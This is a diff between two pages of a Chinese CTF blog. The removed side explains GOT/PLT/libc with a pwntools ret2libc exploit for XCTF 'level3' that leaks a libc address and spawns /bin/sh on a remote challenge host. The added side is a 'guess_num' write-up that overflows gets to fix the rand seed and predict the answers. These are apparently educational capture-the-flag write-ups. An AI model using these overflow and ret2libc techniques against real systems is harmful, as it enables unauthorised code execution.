@@ -4,9 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="浅析got，plt，libc, Matrix">
-    <meta name="description" content="见详解：https://blog.csdn.net/weixin_41185953/article/details/104224260
-在引用一个函数时（如call printf）先会条到该函数的plt表：@plt。然后plt表上存有对应该">
+    <meta name="keywords" content="xctf-gusnum, Matrix">
+    <meta name="description" content="1: file2: checksec3: 运行4: ida伪代码在用rand（）函数产生随机数时一般用srand（）初始化种子（seed）rand函数调用rand()函数每次调用前都会查询是否调用过srand(seed)，是否给seed设定">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>浅析got，plt，libc | Matrix</title>
+    <title>xctf-gusnum | Matrix</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -279,13 +278,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        浅析got，plt，libc
+                        xctf-gusnum
                     </div>
                 </div>
             </div>
@@ -392,21 +391,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-05-23
+                    2020-03-23
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1k
+                        541
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        2 分
                     </div>
                     
                 
@@ -422,51 +421,27 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>见详解：<a href="https://blog.csdn.net/weixin_41185953/article/details/104224260" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/104224260</a></p>
-<p>在引用一个函数时（如call printf）先会条到该函数的plt表：@plt。然后plt表上存有对应该函数的got表地址，跳到got表上。这个表上面存放被引用函数的真实地址。<br>为了程序运行时的效率，还没有引用某个函数时程序不会连接启用包括此函数这样就使程序运行速度更快。</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj19c4.png" alt="picture1"></p>
-<p>libc文件里面包含大量函数包括system，read，write还有字符串/bin/sh ，libc在被程序引用时会分配到一个地址也就是libc的首地址，然后里面的函数或被程序引用。</p>
-<p>引用过程：<br>首先libc分配到一个地址，他里面的函数字符串什么的本来就有内部基于libc首地址的偏移量，这些偏移量都是可以用ELF指令解析libc文件再用搜寻指令查到。所以一旦libc被引用分配得首地址libc里面所包括的所有函数和字符串地址就都确定了。call函数时用上述的plt，got表跳转寻址，最后通过重定位got表得到真实函数地址。</p>
-<p>对应题目：xctf pwn level3<br>1:file</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj1m9O.png" alt="picture2"></p>
-<p>2:checksec</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj1VN6.png" alt="picture3"></p>
-<p>可以栈溢出，NX开启：rop绕过</p>
-<p>3：ida</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj1kH1.png" alt="picture4"></p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj1EAx.png" alt="picture5"></p>
-<p>查看buf的栈空间发现可以溢出：溢出量140</p>
-<p>所以现在的思路就是：payload = “A”*140 + p32(system_addr) + p32(0) + p32(binsh_addr)<br>所以得有哦system函数和binsh字符串   注意此处system函数的构建：函数地址+返回地址+函数参数  很多情况都是在栈中这样构建函数</p>
-<p>4：ida查看函数与字符串</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj1FBR.png" alt="picture6"></p>
-<p>显然这个程序只调用了read和write函数，没有system和binsh。恰好libc里面这两个都有所以要想办法得到libc的基地址。</p>
-<p>这里write函数有三个参数：1，字符串（地址），显示的字节数</p>
-<p>如果我们溢出了read函数后跳到我们自己构建的write函数上，把中间的参数改为write的got地址那么显示出got表上存放write函数的真实<br>地址（plt存储got表地址，got表存放函数地址）。<br>如果我们得到了write函数的真实地址，然后可以轻松得到write函数在libc中的偏移量，最后算出libc的基地址：libc_addr = write_addr - write_offset<br>得到了libc的基地址那么我们就可以得到system和binsh的真实地址，然后再进行一次溢出攻击即可</p>
-<p>exp：<br>from pwn import*</p>
-<p>sh = remote(“124.126.19.106”,52825)</p>
-<p>#sh = process(“level3”)</p>
-<p>elf = ELF(“level3”)<br>libc = ELF(“libc_32.so.6”)</p>
-<p>write_plt = elf.symbols[‘write’]    #write函数的plt地址<br>write_got = elf.got[‘write’]  #write函数的got地址，该地址存放write真实地址<br>main_addr = 0x08048484 #main函数地址可以从ida直接看，也可以elf.symbols[‘main’]搜索</p>
-<p>#print write_plt<br>#print write_got<br>#print main_addr</p>
-<p>payload = “A”*140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #第一次攻击溢出后返回到write函数的plt地址，因为write函数早已调用可以用plt地址或got地址来再次调用。后面时返回地址，返回到主函数将再次执行vulnerable函数以备下一次攻击。p32（1）为write函数的第一个参数，接下来分别是第二个第三个参数。p32（write_got）将go地址发给write作为参数，write将读取该地址上的内容并以字符串输出，p32(4)输出4字节</p>
-<p>#p.recv()<br>sh.recv() </p>
-<p>sh.sendline(payload)</p>
-<p>write_addr = u32(sh.recv(4))  #sh.recv(4)是接受4个字节的输出，u32和p32功能相反</p>
-<p>#print write_addr</p>
-<p>libc_addr = write_addr - libc.symbols[‘write’] #减去了write的offset</p>
-<p>#print(hex(libc_addr))</p>
-<p>#print “libc”+hex(libc_addr)</p>
-<p>binsh_addr = libc_addr + libc.search(“/bin/sh”).next()  #得到binsh真实地址</p>
-<p>#print “binsh_addr =&gt; “+hex(binsh_addr)</p>
-<p>sys_addr = libc_addr + libc.symbols[‘system’]  #得到system真实地址</p>
-<p>print “sys_addr =&gt; “+hex(sys_addr)</p>
-<p>payload = “A”*140 + p32(sys_addr) + p32(0) + p32(binsh_addr)  #通过上次攻击返回地址位vulnerable函数可以再次攻击</p>
+                <p>1: file<br><img src="https://s1.ax1x.com/2020/05/23/YjOiQA.png" alt="64位"><br>2: checksec<br><img src="https://s1.ax1x.com/2020/05/23/YjOCzd.png" alt="保护全开"><br>3: 运行<br><img src="https://s1.ax1x.com/2020/05/23/YjLxIO.png" alt=""><br>4: ida伪代码<br><img src="https://s1.ax1x.com/2020/05/23/YjOpJe.png" alt=""><br>在用rand（）函数产生随机数时一般用srand（）初始化种子（seed）<br>rand函数调用<br>rand()函数每次调用前都会查询是否调用过srand(seed)，是否给seed设定了一个值，如果有那么它会自动调用srand(seed)一次来初始化它的起始值<br>若之前没有调用srand（seed），那么系统会自动给seed赋初始值，即srand（1）自动调用它一次</p>
+<p>rand（）产生随机数时，如果用srand（seed）播下种子之后，一旦种子相同（下面的getpid方法），产生的随机数将是相同的。当然很多时候刻意让rand（）产生的随机数随机化，用时间作种子 srand（time（NULL）），这样每次运行程序的时间肯定是不相同的，产生的随机数肯定就不一样了。</p>
+<p>从上面伪代码的解析可知：关键在于10次循环，每一次输入的值v4得等于随机数v6（1~6之间）就可以进入sub_C3E函数得到flag</p>
+<p>gets函数：的v7：<br><img src="https://s1.ax1x.com/2020/05/23/YjLvdK.png" alt=""></p>
+<p>可知v7大小0x30-0x10=0x20,下面就是seed这个sedd大小我没从stack中看出，在伪代码中定义的seed是unsigned int seed[2];<br> 大小为8个字节。<br>伪代码中srand用的是seed[0]所以如果能将seed[0]覆盖为以知就可以再写一个程序来得到rand的随机数（在linux中写）<br>得到随机数就能进入目标函数</p>
+<p>尝试：<br>用0x20个字符填满v7后面加上0000，记住gets是将输入做当字符串，所以0000填满了seed[0]后因为seed是int型数据，里面的字符串以ASCII码存入会被直接解释为int数据即：0000的ASCII为0x30303030<br>所以seed的值为0x30303030，所以我们的代码seed值就是0x30303030：<br>#include&lt;stdio.h&gt;<br>#include&lt;stdlib.h&gt;</p>
+<p>int main()<br>{<br>        srand(0x30303030);<br>        int i;<br>        for(i=0;i&lt;=9;i++){<br>                printf(“%d\n”,rand()%6 + 1);<br>        }</p>
+<pre><code>    return 0;</code></pre><p>}<br>结果：</p>
+<p><img src="https://s1.ax1x.com/2020/05/23/YjOSiD.png" alt=""></p>
+<p>所以我们payload = “A”*0x20 + “0000”:<br><img src="https://s1.ax1x.com/2020/05/23/YjO9RH.png" alt=""></p>
+<p>确实如此！！！！</p>
+<p>写exp：<br>rom pwn import*</p>
+<p>context.log_level = ‘debug’</p>
+<p>sh = remote(“<strong>*”,*</strong>)</p>
 <p>sh.recv()</p>
+<p>payload = “A”*0x20 + “0000”</p>
 <p>sh.sendline(payload)</p>
-<p>sh.interactive()</p>
-<p>注意在本地测试脚本时要找到本地level3引用的libc文件：指令ldd level3</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yj1Z4K.png" alt="picture7"></p>
-<p>因为本地的libc文件和题目给的有点不一样，至少offset是不一样的。</p>
+<p>sh.recv()</p>
+<p>num = [“6”,”5”,”1”,”4”,”3”,”1”,”1”,”4”,”3”,”1”]</p>
+<p>for i in range(10):<br>        sh.sendline(num[i])<br>        sh.recv()</p>
+<p>本地测试：<br><img src="https://s1.ax1x.com/2020/05/23/YjOFsI.png" alt=""></p>
 
             </div>
             <hr/>
@@ -607,7 +582,7 @@
                     </span>
                     <a href="http://squarepants0.github.io" class="b-link-green">Matrix</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/05/23/qian-xi-got-plt-libc/" class="b-link-green">浅析got，plt，libc</a>
+                    <a href="/2020/03/23/xctf-gusnum/" class="b-link-green">xctf-gusnum</a>
                 </p>
             </div>
         </div>
@@ -632,23 +607,20 @@
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/05/23/mass/">
+                <a href="/2020/04/23/elf-zhi-xing-quan-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="mass">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="ELF执行权限">
                         
-                        <span class="card-title">mass</span>
+                        <span class="card-title">ELF执行权限</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">             hexo基本写文章操作：1：在自己本地blog文件夹git bash here
-2:在bash中：hexo n “name” 或是直接在_posts中写文章
-3：文章中插入图片    语法：
-![图片alt](图片</div>
+                    <div class="summary">使用chmod命令：chmod用于管理文件或目录的权限，文件或目录权限的控制分别以读取(r)、写入(w)、执行(x)3种可读可写可执行，抽象的用二进制来表示 1 代表拥有该权限，0 代表没有该权限，这样我们就可以看到具有全部权限二进制可理解</div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-23
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-04-23
                         </span>
                         <span class="publish-author">
                             
@@ -661,8 +633,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/mass/" target="_blank">
-                        <span class="chip bg-color">mass</span>
+                    <a href="/tags/linux/" target="_blank">
+                        <span class="chip bg-color">linux</span>
                     </a>
                     
                 </div>
@@ -676,22 +648,21 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/05/22/formal/">
+                <a href="/2019/12/08/her/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="Format String Exploit">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="Thinking">
                         
-                        <span class="card-title">Format String Exploit</span>
+                        <span class="card-title">Thinking</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">                   格式化字符串漏洞原理格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。比如说’%s’表明我们会输出一个字符串参数。
-
-对于这样的例子，在</div>
+                    <div class="summary">时间无限延长，爱，仅仅是低等文明的一个产物。无论后世的万语千言，请把握我们特殊的文明。For Her loving forever
+</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-22
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-08
                             </span>
                         <span class="publish-author">
                             
@@ -704,8 +675,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn/" target="_blank">
-                        <span class="chip bg-color">pwn</span>
+                    <a href="/tags/Her/" target="_blank">
+                        <span class="chip bg-color">Her</span>
                     </a>
                     
                 </div>
